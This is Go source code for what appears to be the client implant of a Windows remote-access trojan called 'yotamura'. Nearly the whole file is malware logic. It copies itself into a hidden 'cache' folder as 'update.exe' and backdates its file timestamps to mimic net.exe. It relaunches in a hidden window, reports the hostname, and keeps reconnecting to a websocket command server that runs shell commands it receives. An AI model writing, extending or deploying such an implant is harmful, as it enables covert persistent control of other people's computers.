package main

import (
	"encoding/json"
	"fmt"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"path"
	"strings"
	"syscall"
	"time"
	"yotamura/common"

	"github.com/gorilla/websocket"
)

type Client struct {
	Address string
	*common.Client
}

func Exec(command string) ([]byte, error) {
	fmt.Println("running ", command)
	cmd_path := "C:\\Windows\\system32\\cmd.exe"
	cmd_instance := exec.Command(cmd_path) //, "/c", command)
	cmd_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CmdLine: "/c " + command}
	cmd_output, err := cmd_instance.Output()
	return cmd_output, err
}

func ExecBackground(command string) {
	fmt.Println("starting ", command)
	var cmd *exec.Cmd

	cmd_path := "C:\\Windows\\system32\\cmd.exe"
	cmd = exec.Command(cmd_path, "/c", "start", "", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Start()

}

func (c *Client) SendStats() {
	//sends the information about this client
	//such as the pc hostname
	//and possibly other things

	hostname, _ := os.Hostname()
	c.SendJsonMessage(common.CreateMessage(common.StatsData{Name: hostname}))
}

func reconnect() {
	fmt.Println("reconnecting in 10s")
	time.Sleep(10 * time.Second)
	go main()
}

func ChangeFileCreationDate(file string) {
	// (Get-Item C:\Users\meow\AppData\Local\cache).CreationTime = (Get-Item C:\Windows\System32\net.exe).CreationTime
	//(Get-Item C:\Users\meow\AppData\Local\cache).LastWriteTime = (Get-Item C:\Windows\System32\net.exe).LastWriteTime
	_ = fmt.Sprintf(`
	(Get-Item %s).CreationTime = (Get-Item C:\Windows\System32\net.exe).CreationTime
	&& (Get-Item %s).LastWriteTime = (Get-Item C:\Windows\System32\net.exe).LastWriteTime`,
		file, file)

	uh := fmt.Sprintf(`powershell /c $newCreationDate = (Get-Item C:\Windows\System32\net.exe).CreationTime; $filePath='%s'; Set-ItemProperty -Path $filePath -Name LastWriteTime -Value $newCreationDate`, file)

	Exec(uh)
}

var wantPersist = true

func persist() {
	if !wantPersist {
		return
	}

	ex, err := os.Executable()
	if err != nil {
		panic(err)
	}
	fmt.Println(ex)
	userHomeDir, _ := os.UserHomeDir()
	if strings.Contains(ex, "go-build") || strings.Contains(ex, userHomeDir+"\\cache") {
		//this will stop this function from doing anything else
		//1. if this program is run with "go run"
		//2. if the program already exists in the appdata folder
		return
	}

	programDir := path.Join(userHomeDir, "cache")
	if !common.FileExists(programDir) {
		os.Mkdir(programDir, 0644)
	}
	destination := path.Join(programDir, "update.exe")
	if common.FileExists(destination) {
		os.Remove(destination)
	}
	common.CopyFile(ex, destination)

	ChangeFileCreationDate(programDir)
	ChangeFileCreationDate(destination)

	ExecBackground(destination)
	os.Exit(0)
}

// allows this program to be built as a DLL
func init() {
	//persist doesn't work with a DLL
	wantPersist = false
	main()
}

func main() {
	persist()

	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)

	u := url.URL{Scheme: "ws", Host: address, Path: "/ws"}
	fmt.Printf("connecting to %s\n", u.String())

	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		fmt.Println("dial:", err)
		go reconnect()
		return
	}
	defer c.Close()

	done := make(chan struct{})

	client := Client{
		Address: GetLocalServerAddress(),
		Client: &common.Client{
			Ws:             c,
			MessageChannel: make(map[string]chan common.Message),
		},
	}
	go client.initializeHandlers()

	go client.HandleMessages()
	fmt.Println("handle messages goroutine started")
	go client.SendStats()
	go func() {
		defer close(done)
		for {
			_, msg, err := c.ReadMessage()
			if err != nil {
				fmt.Println("read:", err)
				go reconnect()
				return
			}

			message := common.Message{}
			err = json.Unmarshal(msg, &message)
			if err != nil {
				fmt.Println("failed to convert message to struct")
			}

			client.BroadcastWsMessage(message)
		}
	}()

	channel := make(chan os.Signal, 1)
	signal.Notify(channel, os.Interrupt, syscall.SIGTERM)

	<-channel
	os.Exit(0)
}
